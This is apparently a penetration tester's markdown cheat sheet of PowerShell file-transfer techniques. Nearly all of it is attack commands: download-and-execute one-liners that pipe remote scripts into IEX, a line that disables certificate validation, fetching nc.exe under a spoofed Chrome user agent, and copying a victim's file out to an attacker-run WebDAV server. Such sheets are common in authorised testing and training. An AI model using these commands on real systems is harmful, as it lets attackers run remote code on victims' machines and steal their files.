# Powershell - file transfert

## powershell - DownloadString, file download
```
IEX (New-Object Net.WebClient).DownloadString('<url>')
```

## powershell - DownloadString, file download
```
(New-Object Net.WebClient).DownloadString('<url>') | IEX
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} // if certificate is not trusted
```

## powershell - InvokeWebRequest, file download
```
Invoke-WebRequest <url> -OutFile <Outfile>
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX // if IE first-launch conf has not been completed, bypass
```

## powershell - copy file from smbserver
```
copy \\<IP>\<share>\<file>
```
## powershell - ftp, copy file
 ```
(New-Object Net.WebClient).DownloadFile('ftp://<ip>/<file>', '<outfile>')
```

## powershell - Invoke-FileUpload, upload a file to python upload server
```
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://<IP>:<PORT>/upload -File
```

## powershell - B64 web upload
```
[System.convert]::ToBase64String((Get-Content -Path '<File>' -Encoding Byte))
```

## powershell - webdav file upload (install wsgidav cheroot on atk machine)
```
// atk machine
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous

// victim
// dir \\<IP>\DavWWWRoot // connecto the root of WebDAV srv
copy C:\Users\john\Desktop\SourceCode.zip \\<IP>\<share>\

```

## Invoke-WebRequest using a Chrome User Agent
```
Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"
```
## powersehell - winrm transfert
```
// create a pwsh remoting session
$Session = New-PSSession -ComputerName <COMPUTER NAME>

// Copy FILE from our Localhost to the DEST Session
Copy-Item -Path <Path/to/file> -ToSession $Session -Destination <path/to/dest>

// Copy FILE from DEST Session to our Localhost
Copy-Item -Path "<FILE>" -Destination C:\ -FromSession $Session
```

## openssl - file encryption
```markdown
openssl enc -aes256 -iter 100000 -pbkdf2 -in <input_file> -out <output_file>
```

## openssl - file decryption
```markdown
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in <input_file> -out <output_file>
```
